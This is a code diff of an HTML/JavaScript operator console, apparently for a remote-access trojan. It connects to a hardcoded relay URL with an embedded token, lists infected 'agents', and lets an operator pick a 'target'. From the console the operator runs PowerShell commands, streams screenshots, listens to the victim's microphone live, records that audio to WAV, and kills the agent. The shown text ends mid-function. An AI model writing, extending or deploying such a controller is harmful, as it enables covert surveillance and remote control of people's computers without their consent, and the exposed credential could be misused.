@@ -1,57 +1,260 @@
 <!doctype html>
-<html><head><meta charset="utf-8">
-<title>ops</title>
+<html lang="en"><head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>ops · console</title>
 <style>
-  body{font-family:ui-monospace,monospace;background:#111;color:#ddd;margin:0;padding:16px}
-  #hdr{display:flex;gap:8px;align-items:center;margin-bottom:12px;flex-wrap:wrap}
-  #agents{background:#1a1a1a;color:#0f0;border:1px solid #333;padding:6px;min-width:280px}
-  #out{background:#000;color:#9f9;border:1px solid #333;padding:8px;height:40vh;overflow:auto;white-space:pre-wrap;font-size:13px}
-  #cmd{width:100%;background:#000;color:#fff;border:1px solid #333;padding:8px;font-family:inherit;box-sizing:border-box}
-  button{background:#333;color:#fff;border:1px solid #555;padding:6px 10px;cursor:pointer}
-  button:hover{background:#444}
-  button:disabled{opacity:.4;cursor:not-allowed}
-  #shot{max-width:100%;border:1px solid #333;margin-top:12px;display:block;background:#000;min-height:40px}
-  #status{color:#888;font-size:12px}
-  #micwrap{display:flex;gap:6px;align-items:center;margin-top:8px;flex-wrap:wrap}
-  #vu{width:160px;height:10px;background:#222;border:1px solid #333}
-  #vu>div{height:100%;width:0%;background:#0f0;transition:width .05s linear}
-  #audstat{color:#888;font-size:12px}
-  #recstat{color:#0f0;font-size:12px}
-  #recwrap{display:flex;gap:8px;align-items:center;margin-top:8px}
-  #recwrap input{width:280px;background:#000;color:#fff;border:1px solid #333;padding:6px;font-family:inherit}
-</style></head>
+  :root{
+    --bg:#0b0d10;
+    --panel:#12161b;
+    --panel2:#1a1f26;
+    --line:#252b33;
+    --text:#d5dce6;
+    --dim:#7b8696;
+    --accent:#39d47d;
+    --accent2:#2ecc71;
+    --danger:#e84c4c;
+    --warn:#f0a93b;
+    --mono:ui-monospace,SFMono-Regular,Menlo,Consolas,"Liberation Mono",monospace;
+  }
+  *{box-sizing:border-box}
+  html,body{margin:0;height:100%}
+  body{
+    background:
+      radial-gradient(1200px 600px at 10% -10%,rgba(57,212,125,.06),transparent 60%),
+      radial-gradient(900px 500px at 100% 0%,rgba(70,130,255,.05),transparent 60%),
+      var(--bg);
+    color:var(--text);
+    font-family:var(--mono);font-size:13px;
+    display:flex;flex-direction:column;min-height:100vh;
+  }
+  header{
+    display:flex;align-items:center;gap:10px;
+    padding:12px 16px;border-bottom:1px solid var(--line);
+    background:linear-gradient(180deg,rgba(255,255,255,.02),transparent);
+    position:sticky;top:0;z-index:10;
+  }
+  .brand{display:flex;align-items:center;gap:8px;margin-right:16px}
+  .dot{width:8px;height:8px;border-radius:50%;background:var(--danger);box-shadow:0 0 8px rgba(232,76,76,.6)}
+  .dot.ok{background:var(--accent);box-shadow:0 0 8px rgba(57,212,125,.6)}
+  .brand b{font-weight:600;letter-spacing:.06em}
+  .sep{width:1px;height:22px;background:var(--line)}
+  button{
+    background:var(--panel2);color:var(--text);border:1px solid var(--line);
+    padding:7px 12px;border-radius:6px;cursor:pointer;
+    font-family:var(--mono);font-size:12px;letter-spacing:.02em;
+    transition:background .12s,border-color .12s,color .12s,transform .04s;
+  }
+  button:hover{background:#222932;border-color:#36404b}
+  button:active{transform:translateY(1px)}
+  button.primary{background:rgba(57,212,125,.12);border-color:rgba(57,212,125,.35);color:#8ff0b7}
+  button.primary:hover{background:rgba(57,212,125,.2)}
+  button.danger{background:rgba(232,76,76,.12);border-color:rgba(232,76,76,.35);color:#ffb3b3}
+  button.danger:hover{background:rgba(232,76,76,.2)}
+  button:disabled{opacity:.4;cursor:not-allowed;transform:none}
+  select,input{
+    background:var(--panel2);color:var(--text);
+    border:1px solid var(--line);border-radius:6px;
+    padding:7px 10px;font-family:var(--mono);font-size:12px;
+    outline:none;
+  }
+  select:focus,input:focus{border-color:var(--accent)}
+  select{min-width:280px}
+
+  main{
+    flex:1;display:grid;
+    grid-template-columns:minmax(0,1fr) 360px;
+    gap:12px;padding:12px 16px;min-height:0;
+  }
+  @media (max-width:1000px){
+    main{grid-template-columns:1fr}
+  }
+  .panel{
+    background:var(--panel);border:1px solid var(--line);border-radius:10px;
+    overflow:hidden;display:flex;flex-direction:column;min-height:0;
+  }
+  .panel-h{
+    display:flex;align-items:center;gap:8px;justify-content:space-between;
+    padding:8px 12px;border-bottom:1px solid var(--line);
+    background:linear-gradient(180deg,rgba(255,255,255,.015),transparent);
+    color:var(--dim);font-size:11px;letter-spacing:.12em;text-transform:uppercase;
+  }
+  .panel-h .right{display:flex;gap:6px}
+
+  #screen-wrap{
+    flex:1;display:flex;align-items:center;justify-content:center;
+    background:#05070a;min-height:240px;overflow:hidden;
+  }
+  #shot{max-width:100%;max-height:100%;display:block;object-fit:contain}
+
+  #log{
+    flex:1;overflow:auto;background:#05070a;color:#b7c4d4;
+    padding:10px 12px;font-size:12px;line-height:1.5;white-space:pre-wrap;
+    min-height:120px;
+  }
+  #log .m-in{color:#9ecbff}
+  #log .m-out{color:#b7e6b7}
+  #log .m-sys{color:#7b8696}
+  #log .m-err{color:#ff9a9a}
+  #log .m-shot{color:#c8b6ff}
+  #log .m-mic{color:#ffd38a}
+
+  #composer{
+    display:flex;gap:8px;padding:10px 12px;border-top:1px solid var(--line);
+    background:var(--panel);
+  }
+  #cmd{
+    flex:1;background:#05070a;color:#e6edf5;
+    border:1px solid var(--line);border-radius:6px;
+    padding:9px 12px;font-family:var(--mono);font-size:12.5px;outline:none;
+  }
+  #cmd:focus{border-color:var(--accent)}
+
+  aside{display:flex;flex-direction:column;gap:12px;min-height:0}
+
+  .row{display:flex;gap:6px;flex-wrap:wrap;align-items:center}
+  .metric{
+    display:flex;justify-content:space-between;align-items:center;
+    padding:4px 0;color:var(--dim);font-size:11.5px;
+  }
+  .metric b{color:var(--text);font-weight:500}
+  .card{padding:12px}
+  .card h4{margin:0 0 8px;font-weight:600;color:var(--text);font-size:12px;letter-spacing:.04em}
+  .card + .card{border-top:1px solid var(--line)}
+
+  .vu{
+    width:100%;height:12px;background:#05070a;border:1px solid var(--line);
+    border-radius:3px;overflow:hidden;position:relative;
+  }
+  .vu>i{
+    display:block;height:100%;width:0%;
+    background:linear-gradient(90deg,#1fa55c,#39d47d 60%,#f0a93b 90%,#e84c4c);
+    transition:width .06s linear;
+  }
+  .vu-lbl{display:flex;justify-content:space-between;color:var(--dim);font-size:10.5px;margin-top:4px;letter-spacing:.06em}
+
+  .chip{
+    display:inline-flex;align-items:center;gap:6px;
+    padding:3px 8px;border-radius:999px;
+    background:#1c2229;border:1px solid var(--line);
+    font-size:11px;color:var(--dim);letter-spacing:.04em;
+  }
+  .chip.on{background:rgba(57,212,125,.12);border-color:rgba(57,212,125,.35);color:#8ff0b7}
+  .chip.rec{background:rgba(232,76,76,.12);border-color:rgba(232,76,76,.35);color:#ffb3b3}
+  .chip .d{width:7px;height:7px;border-radius:50%;background:var(--dim)}
+  .chip.on .d{background:var(--accent)}
+  .chip.rec .d{background:var(--danger);animation:pulse 1.1s infinite}
+  @keyframes pulse{50%{opacity:.3}}
+
+  .num{font-variant-numeric:tabular-nums}
+  .hidden{display:none!important}
+
+  .rec-name{
+    flex:1;min-width:120px;background:#05070a;border:1px solid var(--line);
+    border-radius:6px;padding:6px 8px;color:var(--text);font-family:var(--mono);font-size:12px;
+  }
+  .tabs{display:flex;gap:0;border-bottom:1px solid var(--line)}
+  .tab{
+    flex:1;text-align:center;padding:8px 10px;cursor:pointer;
+    color:var(--dim);font-size:11px;letter-spacing:.1em;text-transform:uppercase;
+    border-right:1px solid var(--line);user-select:none;
+  }
+  .tab:last-child{border-right:none}
+  .tab.on{color:var(--text);background:#0f141a;box-shadow:inset 0 -2px 0 var(--accent)}
+</style>
+</head>
 <body>
-<div id="hdr">
-  <button id="connect">connect</button>
+
+<header>
+  <div class="brand"><span class="dot" id="conn-dot"></span><b>ops.console</b></div>
+  <button id="connect" class="primary">connect</button>
   <select id="agents"><option value="">-- pick target --</option></select>
-  <button id="shot1">Single Screenshot</button>
-  <button id="shot2">Stream ON</button>
-  <button id="shot3">Stream OFF</button>
-  <button id="kill">kill</button>
-  <span id="status">idle</span>
-</div>
+  <div class="sep"></div>
+  <span class="chip" id="chip-attach"><span class="d"></span><span>detached</span></span>
+  <span class="chip" id="chip-audio"><span class="d"></span><span>audio idle</span></span>
+  <span class="chip" id="chip-rec"><span class="d"></span><span>rec idle</span></span>
+  <div style="flex:1"></div>
+  <button id="kill" class="danger">kill agent</button>
+</header>
 
-<div id="micwrap">
-  <span style="color:#888;font-size:12px">mic VU:</span>
-  <div id="vu"><div></div></div>
-  <span id="audstat">mic: idle</span>
-  <span id="recstat">record: idle</span>
-</div>
+<main>
+  <section class="panel" style="min-height:0">
+    <div class="panel-h">
+      <span>viewport</span>
+      <div class="right">
+        <button id="shot1">single</button>
+        <button id="shot2" class="primary">stream</button>
+        <button id="shot3">stop</button>
+      </div>
+    </div>
+    <div id="screen-wrap"><img id="shot" alt=""></div>
+    <div class="panel-h"><span>shell</span><span class="num" id="outstat" style="color:#7b8696;font-size:11px">0 out</span></div>
+    <div id="log"></div>
+    <div id="composer">
+      <input id="cmd" placeholder="PowerShell — press Enter to send" autocomplete="off">
+    </div>
+  </section>
 
-<div id="recwrap">
-  <button id="recStart">🎙 Start Recording</button>
-  <button id="recStop" disabled>⏹ Stop &amp; Save</button>
-  <input id="recName" value="mic_capture" placeholder="file name (no ext)">
-  <span style="color:#888;font-size:12px" id="recInfo"></span>
-</div>
+  <aside>
+    <div class="panel">
+      <div class="panel-h"><span>audio</span>
+        <div class="right">
+          <button id="mic1" class="primary">mic on</button>
+          <button id="mic2">mic off</button>
+        </div>
+      </div>
+      <div class="card">
+        <div class="vu"><i id="vu"></i></div>
+        <div class="vu-lbl"><span>peak</span><span class="num" id="vu-peak">0</span></div>
+        <div class="tabs" style="margin-top:10px;border-top:1px solid var(--line)">
+          <div class="tab on" data-mode="live">live</div>
+          <div class="tab" data-mode="record">record</div>
+        </div>
+        <div id="pane-live" class="pane">
+          <div class="row" style="margin-top:10px">
+            <button id="aud-on">audio on</button>
+            <button id="aud-off">audio off</button>
+            <button id="mute" title="mute">🔇</button>
+          </div>
+          <div class="metric"><span>path</span><b id="audpath">webaudio</b></div>
+          <div class="metric"><span>ctx</span><b id="audctx">idle</b></div>
+          <div class="metric"><span>frames in</span><b class="num" id="audin">0</b></div>
+          <div class="metric"><span>frames played</span><b class="num" id="audout">0</b></div>
+          <div class="metric"><span>dropped</span><b class="num" id="auddrop">0</b></div>
+        </div>
+        <div id="pane-record" class="pane hidden">
+          <div class="row" style="margin-top:10px">
+            <button id="recStart" class="primary">● start</button>
+            <button id="recStop" disabled>■ stop &amp; save</button>
+          </div>
+          <input id="recName" class="rec-name" value="mic_capture" placeholder="file name (no ext)" style="width:100%;margin-top:8px">
+          <div class="metric"><span>duration</span><b class="num" id="recDur">0:00</b></div>
+          <div class="metric"><span>size</span><b class="num" id="recSize">0 KB</b></div>
+          <div class="metric"><span>peak</span><b class="num" id="recPeak">0.00</b></div>
+          <div class="metric"><span>file</span><b id="recFile" style="font-size:11px;color:#7b8696">—</b></div>
+        </div>
+      </div>
+    </div>
 
-<div id="out"></div>
-<input id="cmd" placeholder="PowerShell — press Enter to send">
-<img id="shot" alt="">
+    <div class="panel" style="flex:1;min-height:0">
+      <div class="panel-h"><span>agent diag</span></div>
+      <div class="card" style="overflow:auto;flex:1;min-height:0">
+        <div class="metric"><span>rate</span><b class="num" id="d-rate">—</b></div>
+        <div class="metric"><span>channels</span><b class="num" id="d-ch">—</b></div>
+        <div class="metric"><span>bits</span><b class="num" id="d-bits">—</b></div>
+        <div class="metric"><span>format</span><b id="d-fmt">—</b></div>
+        <div class="metric"><span>frames captured</span><b class="num" id="d-frames">—</b></div>
+        <div class="metric"><span>packets</span><b class="num" id="d-pkts">—</b></div>
+        <div class="metric"><span>silent packets</span><b class="num" id="d-silent">—</b></div>
+        <div class="metric"><span>last peak</span><b class="num" id="d-peak">—</b></div>
+      </div>
+    </div>
+  </aside>
+</main>
 
 <script>
 // =========================================================================
-// FILL — relay URL and token
+// FILL
 // =========================================================================
 const RELAY = "wss://operator-nmth.onrender.com/ws";
 const TOKEN = "jf8CL2Cfgl3Wrfng1wbZ1aRXjEb225c8TCS/7HDbry0=";
@@ -59,46 +262,88 @@ const TOKEN = "jf8CL2Cfgl3Wrfng1wbZ1aRXjEb225c8TCS/7HDbry0=";
 // =========================================================================
 // DOM
 // =========================================================================
-const outEl     = document.getElementById('out');
-const agentsEl  = document.getElementById('agents');
-const shotEl    = document.getElementById('shot');
-const statusEl  = document.getElementById('status');
-const vuEl      = document.querySelector('#vu > div');
-const audstatEl = document.getElementById('audstat');
-const recstatEl = document.getElementById('recstat');
-const recInfoEl = document.getElementById('recInfo');
-const recStartBtn = document.getElementById('recStart');
-const recStopBtn  = document.getElementById('recStop');
-const recNameEl   = document.getElementById('recName');
+const $ = id => document.getElementById(id);
+const connDot = $('conn-dot');
+const agentsEl = $('agents');
+const logEl = $('log');
+const shotEl = $('shot');
+const cmdEl = $('cmd');
+const outstat = $('outstat');
+const chipAttach = $('chip-attach');
+const chipAudio = $('chip-audio');
+const chipRec = $('chip-rec');
+
+const vuEl = $('vu');
+const vuPeakEl = $('vu-peak');
+const audPathEl = $('audpath');
+const audCtxEl = $('audctx');
+const audInEl = $('audin');
+const audOutEl = $('audout');
+const audDropEl = $('auddrop');
+const muteBtn = $('mute');
+
+const recStart = $('recStart');
+const recStop = $('recStop');
+const recName = $('recName');
+const recDur = $('recDur');
+const recSize = $('recSize');
+const recPeakEl = $('recPeak');
+const recFileEl = $('recFile');
+
+const dRate = $('d-rate'), dCh = $('d-ch'), dBits = $('d-bits'),
+      dFmt = $('d-fmt'), dFrames = $('d-frames'), dPkts = $('d-pkts'),
+      dSilent = $('d-silent'), dPeak = $('d-peak');
 
 // =========================================================================
 // State
 // =========================================================================
 let ws = null;
 let attachedId = null;
-let frames = 0;
-let outs = 0;
+let frames = 0, outs = 0;
+
+// Audio — live path
+let audioCtx = null;
+let nextTime = 0;
+const jitterBuffer = 0.12;
+let micOn = false;
+let muted = false;
+let audIn = 0, audOut = 0, audDrop = 0;
+let lastPeak = 0;
+let audioPath = 'webaudio'; // 'webaudio' | 'wav'
+
+// WAV fallback for live path
+let wavAudio = null;
+let wavQueue = [];
+let wavPlaying = false;
 
 // Recording
 let recording = false;
 let recStartedAt = 0;
-let recChunks = 0;
-let recSamples = 0;                // total int16 samples captured
-let recPeak = 0;                   // peak amplitude seen across capture
-let recBytes = null;               // Uint8Array accumulating raw PCM bytes
+let recBytes = null;
+let recPeak = 0;
 let recTicker = null;
 
-const MIC_RATE = 16000;
-const MIC_CH   = 1;
-const MIC_BITS = 16;
+const MIC_RATE = 16000, MIC_CH = 1, MIC_BITS = 16;
 
 // =========================================================================
 // Helpers
 // =========================================================================
-function log(s){ outEl.textContent += s + "\n"; outEl.scrollTop = outEl.scrollHeight; }
-function setStatus(s){ statusEl.textContent = s; }
-function refreshStatus(){
-  setStatus(`attached:${attachedId||'none'}  frames:${frames}  outs:${outs}`);
+function log(msg, cls){
+  const span = document.createElement('span');
+  span.className = cls || '';
+  span.textContent = msg + "\n";
+  logEl.appendChild(span);
+  logEl.scrollTop = logEl.scrollHeight;
+}
+function setChip(el, on, label){
+  el.classList.toggle('on', !!on);
+  el.querySelector('span:last-child').textContent = label;
+}
+function setChipRec(on, label){
+  el = chipRec;
+  el.classList.toggle('rec', !!on);
+  el.classList.toggle('on', false);
+  el.querySelector('span:last-child').textContent = label;
 }
 function b64ToU8(b64){
   const bin = atob(b64);
@@ -116,86 +361,158 @@ function fmtTime(sec){
   const s = Math.floor(sec%60);
   return `${m}:${s.toString().padStart(2,'0')}`;
 }
-
-// =========================================================================
-// Growable PCM byte accumulator
-// =========================================================================
-function appendPcm(bytes){
-  if (!recBytes) {
-    recBytes = new Uint8Array(65536);
-    recBytes._len = 0;
-  }
-  const needed = recBytes._len + bytes.length;
-  if (needed > recBytes.length) {
-    let cap = recBytes.length;
-    while (cap < needed) cap *= 2;
-    const next = new Uint8Array(cap);
-    next.set(recBytes.subarray(0, recBytes._len), 0);
-    next._len = recBytes._len;
-    recBytes = next;
-  }
-  recBytes.set(bytes, recBytes._len);
-  recBytes._len += bytes.length;
+function fmtBytes(b){
+  if (b < 1024) return b + ' B';
+  if (b < 1024*1024) return (b/1024).toFixed(1) + ' KB';
+  return (b/1024/1024).toFixed(2) + ' MB';
 }
 
 // =========================================================================
-// PCM -> WAV blob
+// Audio — WebAudio live path
 // =========================================================================
+function ensureCtx(){
+  if (!audioCtx) {
+    audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+    nextTime = audioCtx.currentTime + jitterBuffer;
+    audioCtx.onstatechange = () => { audCtxEl.textContent = audioCtx.state; };
+  }
+  if (audioCtx.state === 'suspended') audioCtx.resume().catch(()=>{});
+  audCtxEl.textContent = audioCtx.state;
+  return audioCtx;
+}
+async function primeAudio(){
+  const ctx = ensureCtx();
+  try {
+    const b = ctx.createBuffer(1, 1, 22050);
+    const s = ctx.createBufferSource();
+    s.buffer = b; s.connect(ctx.destination); s.start(0);
+  } catch {}
+  try { await ctx.resume(); } catch {}
+}
+window.addEventListener('pointerdown', () => { primeAudio(); }, true);
+window.addEventListener('keydown',     () => { primeAudio(); }, true);
+
+function playPcmWebAudio(b64, rate, ch){
+  if (muted) { audDrop++; audDropEl.textContent = audDrop; return; }
+  const ctx = ensureCtx();
+  if (ctx.state !== 'running') { audDrop++; audDropEl.textContent = audDrop; return; }
+
+  const bytes = b64ToU8(b64);
+  const n = bytes.length >> 1;
+  if (n <= 0) return;
+
+  const i16 = new Int16Array(n);
+  for (let i = 0; i < n; ++i) {
+    let v = bytes[i*2] | (bytes[i*2+1] << 8);
+    if (v & 0x8000) v |= ~0xffff;
+    i16[i] = v;
+  }
+  const f32 = new Float32Array(n);
+  let peak = 0;
+  for (let i = 0; i < n; ++i) {
+    const s = i16[i] / 32768.0;
+    f32[i] = s;
+    const a = s < 0 ? -s : s;
+    if (a > peak) peak = a;
+  }
+  updatePeak(peak);
+
+  const channels = ch || 1;
+  const buf = ctx.createBuffer(channels, Math.max(1, n / channels), rate || 16000);
+  buf.copyToChannel(f32, 0);
+
+  const src = ctx.createBufferSource();
+  src.buffer = buf;
+  src.connect(ctx.destination);
+
+  const now = ctx.currentTime;
+  if (nextTime < now) nextTime = now + jitterBuffer;
+  if (nextTime - now > 0.2) nextTime = now + jitterBuffer;
+  src.start(nextTime);
+  nextTime += buf.duration;
+  audOut++; audOutEl.textContent = audOut;
+}
+
+// =========================================================================
+// Audio — WAV fallback live path
+// =========================================================================
+function ensureWavAudio(){
+  if (wavAudio) return wavAudio;
+  wavAudio = new Audio();
+  wavAudio.autoplay = true;
+  wavAudio.style.display = 'none';
+  document.body.appendChild(wavAudio);
+  return wavAudio;
+}
 function pcmToWavBlob(pcmBytes, rate, ch, bits){
   const dataLen = pcmBytes.length;
   const buf = new ArrayBuffer(44 + dataLen);
-  const view = new DataView(buf);
-  const w = (o, s) => { for (let i = 0; i < s.length; i++) view.setUint8(o+i, s.charCodeAt(i)); };
-  w(0, 'RIFF');
-  view.setUint32(4, 36 + dataLen, true);
-  w(8, 'WAVE');
-  w(12, 'fmt ');
-  view.setUint32(16, 16, true);
-  view.setUint16(20, 1, true);                              // PCM
-  view.setUint16(22, ch, true);
-  view.setUint32(24, rate, true);
-  view.setUint32(28, rate * ch * bits / 8, true);           // byte rate
-  view.setUint16(32, ch * bits / 8, true);                  // block align
-  view.setUint16(34, bits, true);
-  w(36, 'data');
-  view.setUint32(40, dataLen, true);
-  new Uint8Array(buf, 44).set(pcmBytes);
-  return new Blob([buf], { type: 'audio/wav' });
+  const v = new DataView(buf);
+  const w = (o, s) => { for (let i = 0; i < s.length; ++i) v.setUint8(o+i, s.charCodeAt(i)); };
+  w(0,'RIFF'); v.setUint32(4,36+dataLen,true); w(8,'WAVE');
+  w(12,'fmt '); v.setUint32(16,16,true);
+  v.setUint16(20,1,true); v.setUint16(22,ch,true);
+  v.setUint32(24,rate,true); v.setUint32(28,rate*ch*bits/8,true);
+  v.setUint16(32,ch*bits/8,true); v.setUint16(34,bits,true);
+  w(36,'data'); v.setUint32(40,dataLen,true);
+  new Uint8Array(buf,44).set(pcmBytes);
+  return new Blob([buf],{type:'audio/wav'});
 }
+function queuePcmWav(b64, rate, ch){
+  if (muted) { audDrop++; audDropEl.textContent = audDrop; return; }
+  const bytes = b64ToU8(b64);
+  if (bytes.length < 2) return;
 
-// =========================================================================
-// Download trigger
-// =========================================================================
-function saveBlob(blob, filename){
+  let peak = 0;
+  for (let i = 0; i < bytes.length; i += 2) {
+    let v = bytes[i] | (bytes[i+1] << 8);
+    if (v & 0x8000) v |= ~0xffff;
+    const a = (v < 0 ? -v : v) / 32768;
+    if (a > peak) peak = a;
+  }
+  updatePeak(peak);
+
+  const blob = pcmToWavBlob(bytes, rate || 16000, ch || 1, 16);
   const url = URL.createObjectURL(blob);
-  const a = document.createElement('a');
-  a.href = url;
-  a.download = filename;
-  document.body.appendChild(a);
-  a.click();
-  setTimeout(() => {
-    document.body.removeChild(a);
-    URL.revokeObjectURL(url);
-  }, 1000);
+  wavQueue.push(url);
+  playNextWav();
+}
+function playNextWav(){
+  if (wavPlaying || wavQueue.length === 0) return;
+  const el = ensureWavAudio();
+  const url = wavQueue.shift();
+  el.src = url;
+  el.onended = () => { URL.revokeObjectURL(url); wavPlaying = false; audOut++; audOutEl.textContent = audOut; playNextWav(); };
+  el.onerror  = () => { URL.revokeObjectURL(url); wavPlaying = false; playNextWav(); };
+  el.play().then(() => { wavPlaying = true; })
+           .catch(() => { URL.revokeObjectURL(url); wavPlaying = false;
+                          setTimeout(playNextWav, 200); });
+}
+
+function updatePeak(peak){
+  lastPeak = peak;
+  vuEl.style.width = Math.min(100, Math.round(peak*100)) + '%';
+  vuPeakEl.textContent = Math.round(peak*100) + '%';
+  dPeak.textContent = peak.toFixed(3);
 }
 
 // =========================================================================
-// Connect
+// WS
 // =========================================================================
-document.getElementById('connect').onclick = () => {
-  setStatus('connecting…');
+$('connect').onclick = () => {
+  connDot.classList.remove('ok');
+  log('[sys] connecting ' + RELAY, 'm-sys');
   ws = new WebSocket(`${RELAY}?role=operator&token=${encodeURIComponent(TOKEN)}`);
   ws.onopen = () => {
-    setStatus('connected');
-    log("[ws] connected");
+    connDot.classList.add('ok');
+    log('[sys] connected', 'm-sys');
     ws.send(JSON.stringify({op:'list'}));
   };
   ws.onclose = (e) => {
-    setStatus('closed ' + (e.code || ''));
-    log("[ws] closed " + (e.code || '') + ' ' + (e.reason || ''));
+    connDot.classList.remove('ok');
+    log('[sys] closed ' + (e.code||'') + ' ' + (e.reason||''), 'm-err');
   };
-  ws.onerror = () => { setStatus('error'); log("[ws] error"); };
-
+  ws.onerror = () => log('[sys] socket error', 'm-err');
   ws.onmessage = (ev) => {
     let m; try { m = JSON.parse(ev.data); } catch { return; }
 
@@ -209,193 +526,220 @@ document.getElementById('connect').onclick = () => {
         agentsEl.appendChild(o);
       }
       if (cur) agentsEl.value = cur;
-      refreshStatus();
-
+      if (!cur && (m.list||[]).length === 1) {
+        agentsEl.value = m.list[0].id;
+        agentsEl.dispatchEvent(new Event('change'));
+      }
     } else if (m.op === 'attached') {
       attachedId = m.id;
-      log(`[attach] ${m.id}`);
-      refreshStatus();
-
+      setChip(chipAttach, true, 'attached ' + m.id);
+      log('[sys] attached ' + m.id, 'm-sys');
     } else if (m.op === 'err') {
-      log(`[err] ${m.reason}`);
-
+      log('[err] ' + m.reason, 'm-err');
     } else if (m.op === 'out') {
-      outs++;
+      outs++; outstat.textContent = outs + ' out';
       try {
         const u8 = b64ToU8(m.data);
-        log(new TextDecoder().decode(u8));
-      } catch (e) { log("[out decode err] " + e.message); }
-      refreshStatus();
-
+        log(new TextDecoder().decode(u8), 'm-out');
+      } catch {}
     } else if (m.op === 'log') {
-      log(`[agent] ${m.msg}`);
-
+      log('[agent] ' + m.msg, 'm-sys');
     } else if (m.op === 'frame') {
       frames++;
       shotEl.src = 'data:image/jpeg;base64,' + m.data;
-      refreshStatus();
-
     } else if (m.op === 'pcm') {
-      if (!recording) return;
-      const bytes = b64ToU8(m.data);
-      if (bytes.length < 2) return;
-
-      // peak for VU / file metadata
-      let peak = 0;
-      for (let i = 0; i < bytes.length; i += 2) {
-        let v = bytes[i] | (bytes[i+1] << 8);
-        if (v & 0x8000) v |= ~0xffff;
-        const a = (v < 0 ? -v : v) / 32768;
-        if (a > peak) peak = a;
+      audIn++; audInEl.textContent = audIn;
+      if (recording) appendRecording(m.data);
+      if (micOn) {
+        if (audioPath === 'webaudio') playPcmWebAudio(m.data, m.rate || 16000, m.ch || 1);
+        else                          queuePcmWav(m.data, m.rate || 16000, m.ch || 1);
       }
-      if (peak > recPeak) recPeak = peak;
-      if (vuEl) vuEl.style.width = Math.min(100, Math.round(peak*100)) + '%';
-
-      appendPcm(bytes);
-      recChunks++;
-      recSamples += bytes.length >> 1;
+    } else if (m.op === 'micPeak') {
+      const v = Number(m.v || 0);
+      if (!recording) updatePeak(v / 32767);
+    } else if (m.op === 'micDiag') {
+      dRate.textContent = m.devRate;
+      dCh.textContent = m.devCh;
+      dBits.textContent = m.devBits;
+      dFmt.textContent = (m.isFloat ? 'float' : '') + (m.isPcm ? 'pcm' : '') || 'unknown';
+      dFrames.textContent = m.frames;
+      dPkts.textContent = m.pkts;
+      dSilent.textContent = m.silentPkts;
+      log(`[diag] rate=${m.devRate} ch=${m.devCh} bits=${m.devBits} ` +
+          `fmt=${dFmt.textContent} frames=${m.frames} pkts=${m.pkts} ` +
+          `silent=${m.silentPkts}`, 'm-sys');
     }
   };
 };
 
-// =========================================================================
-// Attach
-// =========================================================================
 agentsEl.onchange = () => {
   attachedId = agentsEl.value || null;
-  if (attachedId && ws && ws.readyState === 1) {
-    ws.send(JSON.stringify({op:'attach', id: attachedId}));
-  }
-  refreshStatus();
+  if (attachedId && ws && ws.readyState === 1) ws.send(JSON.stringify({op:'attach', id: attachedId}));
+  else setChip(chipAttach, false, 'detached');
 };
 
 // =========================================================================
 // Command
 // =========================================================================
-document.getElementById('cmd').addEventListener('keydown', (e) => {
+cmdEl.addEventListener('keydown', e => {
   if (e.key !== 'Enter') return;
-  const text = e.target.value; e.target.value = '';
+  const text = cmdEl.value; cmdEl.value = '';
   if (!text) return;
-  if (!attachedId) { log("[no target]"); return; }
-  if (!ws || ws.readyState !== 1) { log("[ws down]"); return; }
+  if (!attachedId) { log('[err] no target', 'm-err'); return; }
+  if (!ws || ws.readyState !== 1) { log('[err] ws down', 'm-err'); return; }
   const u8 = new TextEncoder().encode(text);
   ws.send(JSON.stringify({op:'in', data: u8ToB64(u8)}));
-  log("> " + text);
+  log('> ' + text, 'm-in');
 });
 
 // =========================================================================
 // Screenshot
 // =========================================================================
-document.getElementById('shot1').onclick = () => {
-  if (!attachedId || !ws) { log("[no target]"); return; }
+$('shot1').onclick = () => {
+  if (!attachedId || !ws) return log('[err] no target', 'm-err');
   ws.send(JSON.stringify({op:'screenshotOnce'}));
-  log("[shot] single requested");
+  log('[shot] single', 'm-shot');
 };
-document.getElementById('shot2').onclick = () => {
-  if (!attachedId || !ws) { log("[no target]"); return; }
+$('shot2').onclick = () => {
+  if (!attachedId || !ws) return log('[err] no target', 'm-err');
   ws.send(JSON.stringify({op:'screenshot', on:true}));
-  log("[shot] stream ON");
+  log('[shot] stream ON', 'm-shot');
 };
-document.getElementById('shot3').onclick = () => {
-  if (!attachedId || !ws) { log("[no target]"); return; }
+$('shot3').onclick = () => {
+  if (!attachedId || !ws) return log('[err] no target', 'm-err');
   ws.send(JSON.stringify({op:'screenshot', on:false}));
-  log("[shot] stream OFF");
+  log('[shot] stream OFF', 'm-shot');
 };
 
 // =========================================================================
-// RECORDING — record raw PCM, stop builds a WAV, save via download.
+// Mic on/off
 // =========================================================================
-function startRecording(){
-  if (!attachedId || !ws) { log("[no target]"); return; }
-  if (recording) return;
-
-  recBytes = new Uint8Array(65536);
-  recBytes._len = 0;
-  recChunks = 0;
-  recSamples = 0;
-  recPeak = 0;
-  recStartedAt = Date.now();
-  recording = true;
-
-  recStartBtn.disabled = true;
-  recStopBtn.disabled  = false;
-  recstatEl.textContent = 'record: ● rec  0:00  0.00 MB';
-  audstatEl.textContent = 'mic: streaming';
-
-  // tell the agent to start streaming mic
+$('mic1').onclick = async () => {
+  if (!attachedId || !ws) return log('[err] no target', 'm-err');
+  await primeAudio();
+  micOn = true;
   ws.send(JSON.stringify({op:'mic', on:true}));
-  log("[rec] started");
+  setChip(chipAudio, true, 'mic on');
+  log('[mic] on', 'm-mic');
+};
+$('mic2').onclick = () => {
+  if (!attachedId || !ws) return;
+  micOn = false;
+  ws.send(JSON.stringify({op:'mic', on:false}));
+  setChip(chipAudio, false, 'mic off');
+  log('[mic] off', 'm-mic');
+};
+muteBtn.onclick = () => {
+  muted = !muted;
+  muteBtn.textContent = muted ? '🔊' : '🔇';
+};
 
-  recTicker = setInterval(() => {
-    const sec = (Date.now() - recStartedAt) / 1000;
-    const mb  = (recBytes ? recBytes._len : 0) / (1024*1024);
-    recstatEl.textContent = `record: ● rec  ${fmtTime(sec)}  ${mb.toFixed(2)} MB`;
-  }, 250);
+// live audio on/off (only affects playback, agent still streams)
+$('aud-on').onclick = async () => {
+  await primeAudio();
+  log('[aud] path=webaudio', 'm-sys');
+  audioPath = 'webaudio';
+  audPathEl.textContent = 'webaudio';
+  audCtxEl.textContent = audioCtx ? audioCtx.state : 'idle';
+};
+$('aud-off').onclick = () => {
+  log('[aud] path=wav (media element)', 'm-sys');
+  audioPath = 'wav';
